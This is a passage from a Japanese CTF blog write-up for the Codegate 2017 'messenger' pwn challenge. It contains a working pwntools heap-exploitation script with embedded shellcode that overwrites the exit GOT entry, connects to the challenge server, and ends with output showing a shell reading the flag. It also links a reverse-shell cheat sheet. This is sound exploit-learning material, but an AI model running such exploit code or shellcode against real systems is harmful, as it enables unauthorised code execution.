+<a class="sourceLine" id="cb12-22" data-line-number="22">shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xd6\x8b\x8c\x7a\x7b\x73\xaf\x33\xed\x0d\xab\x09\x13</span><span class="st">'</span></a>
+<a class="sourceLine" id="cb12-23" data-line-number="23">shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x73\xd6\x06\xcc\xea\x62\x75\x7e\x73</span><span class="st">'</span></a>
+<a class="sourceLine" id="cb12-24" data-line-number="24"></a>
+<a class="sourceLine" id="cb12-25" data-line-number="25"><span class="co"># r = process('./messenger-patched')</span></a>
+<a class="sourceLine" id="cb12-26" data-line-number="26">r <span class="op">=</span> remote(<span class="st">'110.10.212.137'</span>,  <span class="dv">3333</span>)</a>
+<a class="sourceLine" id="cb12-27" data-line-number="27"></a>
+<a class="sourceLine" id="cb12-28" data-line-number="28"><span class="co">#  _ __ ___   ___  ___ ___  ___ _ __   __ _  ___ _ __</span></a>
+<a class="sourceLine" id="cb12-29" data-line-number="29"><span class="co"># | '_ ` _ \ / _ \/ __/ __|/ _ \ '_ \ / _` |/ _ \ '__|</span></a>
+<a class="sourceLine" id="cb12-30" data-line-number="30"><span class="co"># | | | | | |  __/\__ \__ \  __/ | | | (_| |  __/ |</span></a>
+<a class="sourceLine" id="cb12-31" data-line-number="31"><span class="co"># |_| |_| |_|\___||___/___/\___|_| |_|\__, |\___|_|</span></a>
+<a class="sourceLine" id="cb12-32" data-line-number="32"><span class="co">#                                     |___/</span></a>
+<a class="sourceLine" id="cb12-33" data-line-number="33"><span class="co"># [L]eave message</span></a>
+<a class="sourceLine" id="cb12-34" data-line-number="34"><span class="co"># [R]emove message</span></a>
+<a class="sourceLine" id="cb12-35" data-line-number="35"><span class="co"># [C]hange message</span></a>
+<a class="sourceLine" id="cb12-36" data-line-number="36"><span class="co"># [V]iew message</span></a>
+<a class="sourceLine" id="cb12-37" data-line-number="37"><span class="co"># [Q]uit</span></a>
+<a class="sourceLine" id="cb12-38" data-line-number="38"><span class="co"># &gt;&gt;</span></a>
+<a class="sourceLine" id="cb12-39" data-line-number="39"></a>
+<a class="sourceLine" id="cb12-40" data-line-number="40"><span class="kw">def</span> choose_action(c):</a>
+<a class="sourceLine" id="cb12-41" data-line-number="41">    r.recvuntil(<span class="st">'[Q]uit</span><span class="ch">\n</span><span class="st">&gt;&gt; '</span>)</a>
+<a class="sourceLine" id="cb12-42" data-line-number="42">    r.sendline(c)</a>
+<a class="sourceLine" id="cb12-43" data-line-number="43"></a>
+<a class="sourceLine" id="cb12-44" data-line-number="44"><span class="kw">def</span> leave_message(n, s):</a>
+<a class="sourceLine" id="cb12-45" data-line-number="45">    choose_action(<span class="st">'L'</span>)</a>
+<a class="sourceLine" id="cb12-46" data-line-number="46">    r.recvuntil(<span class="st">'size : '</span>)</a>
+<a class="sourceLine" id="cb12-47" data-line-number="47">    r.sendline(<span class="bu">str</span>(n))</a>
+<a class="sourceLine" id="cb12-48" data-line-number="48">    r.recvuntil(<span class="st">'msg : '</span>)</a>
+<a class="sourceLine" id="cb12-49" data-line-number="49">    r.send(s)</a>
+<a class="sourceLine" id="cb12-50" data-line-number="50"></a>
+<a class="sourceLine" id="cb12-51" data-line-number="51"><span class="kw">def</span> remove_message(i):</a>
+<a class="sourceLine" id="cb12-52" data-line-number="52">    choose_action(<span class="st">'R'</span>)</a>
+<a class="sourceLine" id="cb12-53" data-line-number="53">    r.recvuntil(<span class="st">'index : '</span>)</a>
+<a class="sourceLine" id="cb12-54" data-line-number="54">    r.sendline(<span class="bu">str</span>(i))</a>
+<a class="sourceLine" id="cb12-55" data-line-number="55"></a>
+<a class="sourceLine" id="cb12-56" data-line-number="56"><span class="kw">def</span> change_message(i, n, s):</a>
+<a class="sourceLine" id="cb12-57" data-line-number="57">    choose_action(<span class="st">'C'</span>)</a>
+<a class="sourceLine" id="cb12-58" data-line-number="58">    r.recvuntil(<span class="st">'index : '</span>)</a>
+<a class="sourceLine" id="cb12-59" data-line-number="59">    r.sendline(<span class="bu">str</span>(i))</a>
+<a class="sourceLine" id="cb12-60" data-line-number="60">    r.recvuntil(<span class="st">'size : '</span>)</a>
+<a class="sourceLine" id="cb12-61" data-line-number="61">    r.sendline(<span class="bu">str</span>(n))</a>
+<a class="sourceLine" id="cb12-62" data-line-number="62">    r.recvuntil(<span class="st">'msg : '</span>)</a>
+<a class="sourceLine" id="cb12-63" data-line-number="63">    r.send(s)</a>
+<a class="sourceLine" id="cb12-64" data-line-number="64"></a>
+<a class="sourceLine" id="cb12-65" data-line-number="65"><span class="kw">def</span> view_message(i):</a>
+<a class="sourceLine" id="cb12-66" data-line-number="66">    choose_action(<span class="st">'V'</span>)</a>
+<a class="sourceLine" id="cb12-67" data-line-number="67">    r.recvuntil(<span class="st">'index : '</span>)</a>
+<a class="sourceLine" id="cb12-68" data-line-number="68">    r.sendline(<span class="bu">str</span>(i))</a>
+<a class="sourceLine" id="cb12-69" data-line-number="69">    <span class="cf">return</span> r.recvuntil(<span class="st">'</span><span class="ch">\n</span><span class="st">[L]eave'</span>)[:<span class="op">-</span><span class="bu">len</span>(<span class="st">'</span><span class="ch">\n</span><span class="st">[L]eave'</span>)]</a>
+<a class="sourceLine" id="cb12-70" data-line-number="70"></a>
+<a class="sourceLine" id="cb12-71" data-line-number="71"><span class="kw">def</span> quit():</a>
+<a class="sourceLine" id="cb12-72" data-line-number="72">    choose_action(<span class="st">'Q'</span>)</a>
+<a class="sourceLine" id="cb12-73" data-line-number="73"></a>
+<a class="sourceLine" id="cb12-74" data-line-number="74"><span class="co"># add 1st message</span></a>
+<a class="sourceLine" id="cb12-75" data-line-number="75">leave_message(<span class="dv">4</span>, <span class="st">'AAAA'</span>)</a>
+<a class="sourceLine" id="cb12-76" data-line-number="76"></a>
+<a class="sourceLine" id="cb12-77" data-line-number="77"><span class="co"># gdb-peda$ x/50xg 0x603000 &lt;- heap base</span></a>
+<a class="sourceLine" id="cb12-78" data-line-number="78"><span class="co"># 0x603000:	0x0000000000000018	0x0000000000603018</span></a>
+<a class="sourceLine" id="cb12-79" data-line-number="79"><span class="co"># 0x603010:	0x0000000000000000	0x0000000000000031 &lt;- 1st chunk size</span></a>
+<a class="sourceLine" id="cb12-80" data-line-number="80"><span class="co"># 0x603020:	0x0000000000603048	0x0000000000603000 &lt;- fd, bk</span></a>
+<a class="sourceLine" id="cb12-81" data-line-number="81"><span class="co"># 0x603030:	0x0000000041414141	0x0000000000000000</span></a>
+<a class="sourceLine" id="cb12-82" data-line-number="82"><span class="co"># 0x603040:	0x0000000000000000	0x00000000000003d0 &lt;- 2nd chunk size</span></a>
+<a class="sourceLine" id="cb12-83" data-line-number="83"><span class="co"># 0x603050:	0x0000000000000000	0x0000000000603018 &lt;- fd, bk</span></a>
+<a class="sourceLine" id="cb12-84" data-line-number="84"><span class="co"># 0x603060:	0x0000000000000000	0x0000000000000000</span></a>
+<a class="sourceLine" id="cb12-85" data-line-number="85"></a>
+<a class="sourceLine" id="cb12-86" data-line-number="86"><span class="co"># resize 1st message and overwite 2nd chunk's bk</span></a>
+<a class="sourceLine" id="cb12-87" data-line-number="87">payload <span class="op">=</span> <span class="st">''</span></a>
+<a class="sourceLine" id="cb12-88" data-line-number="88">payload <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> <span class="bn">0x18</span></a>
+<a class="sourceLine" id="cb12-89" data-line-number="89">payload <span class="op">+=</span> p64(<span class="bn">0x3d0</span>)               <span class="co"># size</span></a>
+<a class="sourceLine" id="cb12-90" data-line-number="90">payload <span class="op">+=</span> p64(<span class="dv">0</span>)                   <span class="co"># fd</span></a>
+<a class="sourceLine" id="cb12-91" data-line-number="91">payload <span class="op">+=</span> p64(addr_exit_got <span class="op">-</span> <span class="dv">8</span>)   <span class="co"># bk</span></a>
+<a class="sourceLine" id="cb12-92" data-line-number="92">change_message(<span class="dv">0</span>, <span class="bu">len</span>(payload), payload)</a>
+<a class="sourceLine" id="cb12-93" data-line-number="93"></a>
+<a class="sourceLine" id="cb12-94" data-line-number="94"><span class="co"># add 2nd message</span></a>
+<a class="sourceLine" id="cb12-95" data-line-number="95">leave_message(<span class="dv">4</span>, <span class="st">'AAAA'</span>)</a>
+<a class="sourceLine" id="cb12-96" data-line-number="96"></a>
+<a class="sourceLine" id="cb12-97" data-line-number="97"><span class="co"># remove 2nd message</span></a>
+<a class="sourceLine" id="cb12-98" data-line-number="98"><span class="co"># now, addr_exit_got was overwitten to 3rd chunk's addr</span></a>
+<a class="sourceLine" id="cb12-99" data-line-number="99">remove_message(<span class="dv">1</span>)</a>
+<a class="sourceLine" id="cb12-100" data-line-number="100"></a>
+<a class="sourceLine" id="cb12-101" data-line-number="101"><span class="co"># send shellcode</span></a>
+<a class="sourceLine" id="cb12-102" data-line-number="102">payload <span class="op">=</span> <span class="st">''</span></a>
+<a class="sourceLine" id="cb12-103" data-line-number="103">payload <span class="op">+=</span> <span class="st">'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> <span class="bn">0x100</span></a>
+<a class="sourceLine" id="cb12-104" data-line-number="104">payload <span class="op">+=</span> shellcode</a>
+<a class="sourceLine" id="cb12-105" data-line-number="105">change_message(<span class="dv">0</span>, <span class="bu">len</span>(payload), payload)</a>
+<a class="sourceLine" id="cb12-106" data-line-number="106"></a>
+<a class="sourceLine" id="cb12-107" data-line-number="107"><span class="co"># select undefined action to call exit()</span></a>
+<a class="sourceLine" id="cb12-108" data-line-number="108">choose_action(<span class="st">'Z'</span>)</a>
+<a class="sourceLine" id="cb12-109" data-line-number="109"></a>
+<a class="sourceLine" id="cb12-110" data-line-number="110">r.interactive()</a></code></pre></div>
+<pre><code>$ ./exploit.py
+[+] Opening connection to 110.10.212.137 on port 3333: Done
+[*] Switching to interactive mode
+$ ls
+flag
+messenger
+$ cat flag
+1_wan3_y0ur_m3ssenger$%
+$ 
+[*] Closed connection to 110.10.212.137 port 3333</code></pre>
+<h2 id="おわり">おわり</h2>
+<p>解くのは楽しかったけど, 過去問に似た正答者数の多く得点がどんどん下がっていった問題しか解けてないので厳しい…</p>
+<h3 id="参考url">参考URL</h3>
+<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="nofollow noopener">Reverse Shell Cheat Sheet | pentestmonkey</a></li>
+<li><a href="https://speakerdeck.com/bata_24/katagaitai-ctf-number-1" target="_blank" rel="nofollow noopener">katagaitai CTF勉強会 #1 pwnables編 - DEFCON CTF 2014 pwn1 heap / katagaitai CTF #1 // Speaker Deck</a></li>
+</ul>
+<section class="footnotes">
+<hr />
+<ol>
+<li id="fn1"><p><code>stdin</code>, <code>stdout</code> などがプログラムが動いているサーバ側を向いているため.<a href="#fnref1" class="footnote-back">↩</a></p></li>
+</ol>
+</section></div><aside class="share"><a href="https://twitter.com/share?text=Codegate%202017%20CTF%20prequals%20writeup%20%7C%20Tosainu%20Lab&amp;url=https%3A%2F%2Fblog.myon.info%2Fentry%2F2017%2F02%2F11%2Fcodegate-2017-prequals-writeup%2Findex.html" class="share-button twitter" target="_blank" rel="nofollow noopener"><svg role="img" class="svg-inline--fa fa-twitter fa-w-16 fa-lg" data-icon="twitter" data-prefix="fab" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><span>Twitter</span></a><a href="http://b.hatena.ne.jp/add?mode=confirm&amp;url=https%3A%2F%2Fblog.myon.info%2Fentry%2F2017%2F02%2F11%2Fcodegate-2017-prequals-writeup%2Findex.html&amp;title=Codegate%202017%20CTF%20prequals%20writeup%20%7C%20Tosainu%20Lab" class="share-button hatena" target="_blank" rel="nofollow noopener"><img src="/images/hatenabookmark-logomark.svg"><span>hatena</span></a><a href="https://plusone.google.com/_/+1/confirm?url=https%3A%2F%2Fblog.myon.info%2Fentry%2F2017%2F02%2F11%2Fcodegate-2017-prequals-writeup%2Findex.html" class="share-button google-plus" target="_blank" rel="nofollow noopener"><svg role="img" class="svg-inline--fa fa-google-plus-g fa-w-20 fa-lg" data-icon="google-plus-g" data-prefix="fab" viewBox="0 0 640 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M386.061 228.496c1.834 9.692 3.143 19.384 3.143 31.956C389.204 370.205 315.599 448 204.8 448c-106.084 0-192-85.915-192-192s85.916-192 192-192c51.864 0 95.083 18.859 128.611 50.292l-52.126 50.03c-14.145-13.621-39.028-29.599-76.485-29.599-65.484 0-118.92 54.221-118.92 121.277 0 67.056 53.436 121.277 118.92 121.277 75.961 0 104.513-54.745 108.965-82.773H204.8v-66.009h181.261zm185.406 6.437V179.2h-56.001v55.733h-55.733v56.001h55.733v55.733h56.001v-55.733H627.2v-56.001h-55.733z"></path></svg><span>Google+</span></a><a href="https://getpocket.com/save?url=https%3A%2F%2Fblog.myon.info%2Fentry%2F2017%2F02%2F11%2Fcodegate-2017-prequals-writeup%2Findex.html" class="share-button pocket" target="_blank" rel="nofollow noopener"><svg role="img" class="svg-inline--fa fa-get-pocket fa-w-14 fa-lg" data-icon="get-pocket" data-prefix="fab" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M407.6 64h-367C18.5 64 0 82.5 0 104.6v135.2C0 364.5 99.7 464 224.2 464c124 0 223.8-99.5 223.8-224.2V104.6c0-22.4-17.7-40.6-40.4-40.6zm-162 268.5c-12.4 11.8-31.4 11.1-42.4 0C89.5 223.6 88.3 227.4 88.3 209.3c0-16.9 13.8-30.7 30.7-30.7 17 0 16.1 3.8 105.2 89.3 90.6-86.9 88.6-89.3 105.5-89.3 16.9 0 30.7 13.8 30.7 30.7 0 17.8-2.9 15.7-114.8 123.2z"></path></svg><span>Pocket</span></a></aside><aside class="comments"><div id="disqus_thread"></div><script>(function() { var d = document, s = d.createElement('script');s.src = 'https://tosainu.disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s); })();</script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="nofollow noopener">comments powered by Disqus.</a></noscript></aside><nav class="nav post-nav"></nav></div></article></main><footer class="site-footer"><div class="footer-widgets"><div class="container"><div class="col"><section class="about-me"><h4><svg role="img" class="svg-inline--fa fa-user fa-w-14 fa-fw" data-icon="user" data-prefix="fas" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"></path></svg> About Me</h4><div class="about"><div class="avatar"><img src="/images/icon/cocoa.svg" class="icon" alt="avatar"></div><div class="info"><div class="name"><a href="https://myon.info" target="_blank" rel="nofollow noopener">Tosainu</a></div><div class="info">❤ Arch Linux, ごちうさ</div></div></div></section><section class="recent-posts"><h4><svg role="img" class="svg-inline--fa fa-file-alt fa-w-12 fa-fw" data-icon="file-alt" data-prefix="fas" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224 136V0H24C10.7 0 0 10.7 0 24v464c0 13.3 10.7 24 24 24h336c13.3 0 24-10.7 24-24V160H248c-13.2 0-24-10.8-24-24zm64 236c0 6.6-5.4 12-12 12H108c-6.6 0-12-5.4-12-12v-8c0-6.6 5.4-12 12-12h168c6.6 0 12 5.4 12 12v8zm0-64c0 6.6-5.4 12-12 12H108c-6.6 0-12-5.4-12-12v-8c0-6.6 5.4-12 12-12h168c6.6 0 12 5.4 12 12v8zm0-72v8c0 6.6-5.4 12-12 12H108c-6.6 0-12-5.4-12-12v-8c0-6.6 5.4-12 12-12h168c6.6 0 12 5.4 12 12zm96-114.1v6.1H256V0h6.1c6.4 0 12.5 2.5 17 7l97.9 98c4.5 4.5 7 10.6 7 16.9z"></path></svg> Recent Posts</h4><ul><li><a href="/entry/2018/08/16/non-route-rules/">route なしの Rules で Hakyll のビルドを高速化する</a></li><li><a href="/entry/2018/03/21/hakyll/">ブログを Hakyll に移行した</a></li><li><a href="/entry/2018/01/05/haskell-linear-classifier/">簡単な2クラスの線形分類器を実装してみる</a></li><li><a href="/entry/2017/09/04/twctf-2017-writeups/">Tokyo Westerns CTF 3rd 2017: simple note</a></li><li><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/">DEF CON CTF 2017 Qualifier writeup</a></li></ul></section></div><section class="tag-cloud"><h4><svg role="img" class="svg-inline--fa fa-tags fa-w-20 fa-fw" data-icon="tags" data-prefix="fas" viewBox="0 0 640 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M497.941 225.941L286.059 14.059A48 48 0 0 0 252.118 0H48C21.49 0 0 21.49 0 48v204.118a48 48 0 0 0 14.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882 0l204.118-204.118c18.745-18.745 18.745-49.137 0-67.882zM112 160c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882 0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397 0h48.721a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882z"></path></svg> Tags</h4><ul class="tag-list"><li><a href="/entry/tags/android/"><span>Android</span></a></li><li><a href="/entry/tags/arch-linux/"><span>Arch Linux</span></a></li><li><a href="/entry/tags/arduino/"><span>Arduino</span></a></li><li><a href="/entry/tags/c/"><span>C++</span></a></li><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li><li><a href="/entry/tags/cocoatwit/"><span>CocoaTwit</span></a></li><li><a href="/entry/tags/diy-pc/"><span>DIY PC</span></a></li><li><a href="/entry/tags/game/"><span>Game</span></a></li><li><a href="/entry/tags/gnuplot/"><span>Gnuplot</span></a></li><li><a href="/entry/tags/gochiusa/"><span>Gochiusa</span></a></li><li><a href="/entry/tags/hakyll/"><span>Hakyll</span></a></li><li><a href="/entry/tags/haskell/"><span>Haskell</span></a></li><li><a href="/entry/tags/linux/"><span>Linux</span></a></li><li><a href="/entry/tags/machine-learning/"><span>Machine learning</span></a></li><li><a href="/entry/tags/middleman/"><span>Middleman</span></a></li><li><a href="/entry/tags/network/"><span>Network</span></a></li><li><a href="/entry/tags/raspberry-pi/"><span>Raspberry Pi</span></a></li><li><a href="/entry/tags/ruby/"><span>Ruby</span></a></li><li><a href="/entry/tags/slack/"><span>Slack</span></a></li><li><a href="/entry/tags/vaio-z2/"><span>VAIO Z2</span></a></li><li><a href="/entry/tags/vim/"><span>Vim</span></a></li><li><a href="/entry/tags/walkmanz/"><span>WalkmanZ</span></a></li><li><a href="/entry/tags/website/"><span>Website</span></a></li><li><a href="/entry/tags/xperia-nx/"><span>Xperia NX</span></a></li><li><a href="/entry/tags/xperia-arc/"><span>Xperia arc</span></a></li><li><a href="/entry/tags/xperia2011/"><span>Xperia2011</span></a></li><li><a href="/entry/tags/seccamp/"><span>seccamp</span></a></li></ul></section><section class="archives"><h4><svg role="img" class="svg-inline--fa fa-archive fa-w-16 fa-fw" data-icon="archive" data-prefix="fas" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M32 448c0 17.7 14.3 32 32 32h384c17.7 0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6 0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3 0 64v48c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"></path></svg> Archives</h4><ul class="archive-tree"><li><input id="tree-label-2018" type="checkbox" class="tree-toggle"><label for="tree-label-2018" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2018/">2018 (3)</a></label><ul class="tree-child"><li><a href="/entry/2018/08/">2018/08 (1)</a></li><li><a href="/entry/2018/03/">2018/03 (1)</a></li><li><a href="/entry/2018/01/">2018/01 (1)</a></li></ul></li><li><input checked id="tree-label-2017" type="checkbox" class="tree-toggle"><label for="tree-label-2017" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2017/">2017 (5)</a></label><ul class="tree-child"><li><a href="/entry/2017/09/">2017/09 (1)</a></li><li><a href="/entry/2017/05/">2017/05 (1)</a></li><li><a href="/entry/2017/02/">2017/02 (3)</a></li></ul></li><li><input id="tree-label-2016" type="checkbox" class="tree-toggle"><label for="tree-label-2016" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2016/">2016 (8)</a></label><ul class="tree-child"><li><a href="/entry/2016/08/">2016/08 (2)</a></li><li><a href="/entry/2016/07/">2016/07 (1)</a></li><li><a href="/entry/2016/06/">2016/06 (1)</a></li><li><a href="/entry/2016/05/">2016/05 (1)</a></li><li><a href="/entry/2016/03/">2016/03 (1)</a></li><li><a href="/entry/2016/01/">2016/01 (2)</a></li></ul></li><li><input id="tree-label-2015" type="checkbox" class="tree-toggle"><label for="tree-label-2015" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2015/">2015 (12)</a></label><ul class="tree-child"><li><a href="/entry/2015/12/">2015/12 (1)</a></li><li><a href="/entry/2015/08/">2015/08 (1)</a></li><li><a href="/entry/2015/06/">2015/06 (2)</a></li><li><a href="/entry/2015/05/">2015/05 (2)</a></li><li><a href="/entry/2015/04/">2015/04 (1)</a></li><li><a href="/entry/2015/03/">2015/03 (2)</a></li><li><a href="/entry/2015/02/">2015/02 (1)</a></li><li><a href="/entry/2015/01/">2015/01 (2)</a></li></ul></li><li><input id="tree-label-2014" type="checkbox" class="tree-toggle"><label for="tree-label-2014" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"></path></svg><svg role="img" class="svg-inline--fa fa-angle-down fa-w-10 fa-fw" data-icon="angle-down" data-prefix="fas" viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M143 352.3L7 216.3c-9.4-9.4-9.4-24.6 0-33.9l22.6-22.6c9.4-9.4 24.6-9.4 33.9 0l96.4 96.4 96.4-96.4c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9l-136 136c-9.2 9.4-24.4 9.4-33.8 0z"></path></svg><a href="/entry/2014/">2014 (62)</a></label><ul class="tree-child"><li><a href="/entry/2014/12/">2014/12 (7)</a></li><li><a href="/entry/2014/11/">2014/11 (4)</a></li><li><a href="/entry/2014/10/">2014/10 (3)</a></li><li><a href="/entry/2014/09/">2014/09 (3)</a></li><li><a href="/entry/2014/08/">2014/08 (5)</a></li><li><a href="/entry/2014/07/">2014/07 (6)</a></li><li><a href="/entry/2014/06/">2014/06 (6)</a></li><li><a href="/entry/2014/05/">2014/05 (4)</a></li><li><a href="/entry/2014/04/">2014/04 (6)</a></li><li><a href="/entry/2014/03/">2014/03 (7)</a></li><li><a href="/entry/2014/02/">2014/02 (5)</a></li><li><a href="/entry/2014/01/">2014/01 (6)</a></li></ul></li><li><input id="tree-label-2013" type="checkbox" class="tree-toggle"><label for="tree-label-2013" class="tree-toggle-button"><svg role="img" class="svg-inline--fa fa-angle-right fa-w-8 fa-fw" data-icon="angle-right" data-prefix="fas" viewBox="0 0 256 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="currentColor" d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 